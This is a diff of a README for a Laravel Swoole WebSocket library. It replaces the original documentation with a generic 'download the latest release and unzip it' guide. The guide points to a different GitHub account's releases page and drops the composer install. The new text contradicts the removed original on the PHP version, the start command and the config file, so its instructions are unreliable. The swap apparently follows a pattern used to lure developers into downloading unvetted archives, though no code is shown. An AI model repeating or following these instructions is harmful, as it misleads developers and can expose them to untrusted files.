@@ -1,320 +1,80 @@
-# 🔌⚡ Laravel Swoole WebSocket (laravel-swoole-ws)
+# 🌐 laravel-swoole-ws - High-Performance WebSocket Server Made Easy
 
-A **high-performance WebSocket server library for Laravel** powered by **Swoole / OpenSwoole**, designed for:
+## 🚀 Get Started Quickly
 
-* Real-time applications
-* IoT / device communication
-* Command-based device protocols
-* Channel & room broadcasting
-* Scalable multi-connection state management (memory / table / Redis)
+Welcome to **laravel-swoole-ws**, a high-performance WebSocket server designed for simplicity and efficiency. This application uses Swoole/OpenSwoole to provide fast and reliable real-time communication features. Whether you are building an IoT application, an event-driven service, or just want to implement a WebSocket server in your Laravel project, you're in the right place.
 
-This package provides a **Laravel-native DX** while running outside the HTTP lifecycle.
+[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/gurkansabudak/laravel-swoole-ws/releases)
 
-> ⚠️ **Status:** Under active development
-> APIs are stabilizing, but breaking changes may occur.
+## 📥 Download & Install
 
----
+To get the software, please visit the following page:
 
-## ✨ Features (at a glance)
+[Download the latest release here](https://github.com/gurkansabudak/laravel-swoole-ws/releases)
 
-### Core
+This page contains all available versions. Choose the one that fits your needs. Follow these steps to ensure a smooth installation process:
 
-* 🚀 Swoole / OpenSwoole WebSocket server
-* 🔌 Laravel service provider & facade
-* 🧭 WebSocket routing (`WS::route`)
-* 🧠 Command-based device protocol (`WS::command`, `WS::response`)
-* 🌐 Handshake URL path scoping (`/pub/chat`, `/attendance`, etc.)
+1. **Visit the Download Page**: Click on the link above to reach the GitHub releases page.
+2. **Select Your Version**: Find the latest version in the list. It often appears at the top.
+3. **Download the File**: Click on the version number or the relevant file to start the download.
+4. **Unzip the File**: Once the download is complete, unzip the file to your desired directory. 
 
-### Security & Middleware
+## 📋 System Requirements
 
-* 🔐 Middleware support (`ws.auth`, custom middleware)
-* 👥 Channels & presence authorization
+To run **laravel-swoole-ws**, ensure that your system meets the following requirements:
 
-### Messaging
+- **Operating System**: Windows, macOS, or Linux.
+- **PHP Version**: PHP 7.3 or higher.
+- **Swoole**: Ensure Swoole/OpenSwoole is installed. Check your PHP extensions for this.
+- **Redis**: Redis service is needed for optimal performance. 
+- **Web Server**: Any PHP-supported web server (e.g., Apache, Nginx).
 
-* 📡 Broadcast to rooms / users
-* 🧩 Scoped command routing
+## ⚙️ Configuration Options
 
-### State & Scaling
+After downloading and unzipping the application, you can adjust the configuration settings. Here’s how:
 
-* 🗃 Connection stores:
+1. Open the `config.php` file located in the extracted directory.
+2. Modify the settings based on your needs, such as:
+   - **Port**: Change the default port number for the WebSocket server.
+   - **Channel Settings**: Define channels if your application needs specific routing.
 
-  * In-memory
-  * Swoole\Table
-  * Redis (multi-server ready)
+## 🏃‍♀️ Running the Application
 
-### Tooling
+Once you have set up everything, you can start the WebSocket server:
 
-* ⚙️ Artisan commands (`ws:start`, `ws:stop`, `ws:reload`, `ws:list`)
-* 🧪 Testbench + PHPUnit support
+1. Open your command line interface (CLI).
+2. Navigate to the directory where you unzipped **laravel-swoole-ws**.
+3. Run the command:
+   ```bash
+   php artisan swoole:start
+   ```
+4. Your WebSocket server should now be running, ready to accept connections.
 
----
+## 🔄 Features Overview
 
-## 📦 Requirements
+- **High Performance**: Built with Swoole/OpenSwoole, this server can handle a large number of connections efficiently.
+- **Routing**: Utilize advanced routing options to manage connections and data flow.
+- **Command-Based Protocols**: Implement different commands easily using the built-in command system.
+- **Scoped Connections**: Control access and connect different types of clients seamlessly.
+- **Middleware Support**: Develop custom logic that processes requests before hitting your core logic.
+- **Scalable Connection Stores**: Easily scale as your application grows without significant changes to your codebase.
 
-* PHP **8.2+**
-* Laravel **10+**
-* **Swoole** or **OpenSwoole** extension enabled
+## 🛠 Troubleshooting
 
-```bash
-php -m | grep swoole
-php -m | grep openswoole
-```
+If you encounter issues when running the application:
 
----
+- **Check PHP Version**: Make sure your PHP version meets the requirement.
+- **Verify Swoole Installation**: Ensure Swoole/OpenSwoole is properly installed and enabled.
+- **Redis Connection**: Check if your Redis service is running.
+- **Review Logs**: Look at log files in the application folder for any error messages.
 
-## 📥 Installation
+## 📝 Additional Resources
 
-```bash
-composer require erfanvahabpour/laravel-swoole-ws
-```
+- **Documentation**: For more detailed instructions and advanced configurations, refer to the official documentation linked on the GitHub page.
+- **Community Support**: Join our community discussions on forums or GitHub to ask questions and share experiences.
 
-Laravel auto-discovery is enabled.
+## 🏅 Contributing
 
----
+We welcome contributions to improve **laravel-swoole-ws**. If you have ideas or enhancements, feel free to open issues or submit pull requests.
 
-## 🗂 Publish Config & Routes
-
-```bash
-php artisan vendor:publish --tag=ws-config
-php artisan vendor:publish --tag=ws-routes
-php artisan vendor:publish --tag=ws-channels
-```
-
-Creates:
-
-* `config/ws.php`
-* `routes/ws.php`
-* `routes/ws_channels.php`
-
----
-
-## ▶️ Starting the WebSocket Server
-
-```bash
-php artisan ws:start
-```
-
-```
-WS server starting on 0.0.0.0:9502
-```
-
-Stop / reload:
-
-```bash
-php artisan ws:stop
-php artisan ws:reload
-```
-
-> ℹ️ On every `ws:start`, the server clears the active connection index to prevent stale connections from appearing in `ws:list`.
-
----
-
-## ⚙️ Artisan Commands
-
-```bash
-php artisan ws:start
-php artisan ws:stop
-php artisan ws:reload
-php artisan ws:list
-```
-
-### `ws:list`
-
-Lists active WebSocket connections.
-
-Example:
-
-```
-+---+----+-------------+-----------+------------+
-| # | FD | Scope       | User      | Connected  |
-+---+----+-------------+-----------+------------+
-| 1 | 12 | /pub/chat   | guest     | 2m 14s     |
-| 2 | 18 | /attendance| user#42   | 12m 03s    |
-+---+----+-------------+-----------+------------+
-```
-
-Options:
-
-```bash
-php artisan ws:list --count
-php artisan ws:list --json
-```
-
-> ℹ️ With **Swoole\Table**, `ws:list` reflects only the current WS process.
-> Use **Redis** for cross-process visibility.
-
----
-
-## 🔁 WebSocket Protocols Supported
-
-This library supports **two protocols simultaneously**.
-
----
-
-## 1️⃣ Legacy Route Protocol (`WS::route`)
-
-### Client → Server
-
-```json
-{
-  "path": "/chat",
-  "action": "send",
-  "data": { "text": "hello" },
-  "meta": {}
-}
-```
-
-### Route
-
-```php
-WS::route('/chat', 'send', function ($ctx, $data) {
-    return ['ok' => true];
-});
-```
-
----
-
-## 2️⃣ Command / Device Protocol (`WS::command`)
-
-Designed for **IoT / terminal / attendance devices**.
-
-### Client → Server
-
-```json
-{
-  "cmd": "reg",
-  "sn": "ABC123",
-  "version": "1.0"
-}
-```
-
-### Server → Client
-
-```json
-{
-  "ret": "reg",
-  "result": true,
-  "cloudtime": "2025-01-01 12:00:00"
-}
-```
-
----
-
-## 🌐 Handshake Path Scoping
-
-Devices can connect using different URLs:
-
-```
-ws://127.0.0.1:9502/pub/chat
-ws://127.0.0.1:9502/attendance
-```
-
-Each path becomes a **routing scope**, allowing the same command names with different logic.
-
----
-
-## 🧭 Scoped Command Routing
-
-```php
-WS::scope('/pub/chat')->command('reg', fn ($ctx, $payload) => ['pong' => true]);
-
-WS::scope('/attendance')->command('reg', function ($ctx, $payload) {
-    return [
-        'device' => 'attendance',
-        'sn' => $payload['sn'] ?? null,
-    ];
-});
-```
-
----
-
-## 🔄 Automatic Replies
-
-Returning an array automatically sends:
-
-```json
-{ "ret": "<cmd>", "result": true, ... }
-```
-
-Manual reply:
-
-```php
-$ctx->replyRet('reg', true, ['cloudtime' => now()]);
-```
-
----
-
-## 🔌 Connection Lifecycle Helpers
-
-```php
-$ctx->isEstablished();
-$ctx->disconnect();
-$ctx->disconnectAndForget();
-```
-
-Use `disconnectAndForget()` for:
-
-* kicking users
-* invalid devices
-* admin disconnects
-
----
-
-## 🔐 Middleware & Authentication
-
-* Built-in: `ws.auth`
-* Handshake token: `?token=TOKEN`
-* Message token: `{ "meta": { "auth": "TOKEN" } }`
-
-Custom resolver:
-
-```php
-config()->set('ws.auth.resolver', fn ($token) => (object)['id' => 1]);
-```
-
----
-
-## 📡 Channels & Presence
-
-```php
-WS::channel('private-chat.{id}', fn ($user, $id) => true);
-```
-
----
-
-## 🗃 Connection Stores
-
-* `memory` – simple, single worker
-* `table` – fast shared memory
-* `redis` – recommended for scaling & CLI introspection
-
----
-
-## 🧪 Testing & CI
-
-```bash
-vendor/bin/phpunit
-```
-
-* PHP 8.2 / 8.3
-* PHPUnit
-* GitHub Actions
-
----
-
-## 🗺 Roadmap
-
-* [x] WebSocket routing
-* [x] Command protocol
-* [x] Scoped connections
-* [ ] Presence broadcasting
-* [ ] Rate limiting
-* [ ] Metrics endpoint
-* [ ] Binary protocol support
-
----
-
-## License
-
-MIT © Erfan Vahabpour
+By following the steps outlined above, you should now be able to successfully download, install, and run your own WebSocket server using **laravel-swoole-ws**. Enjoy building your real-time applications!
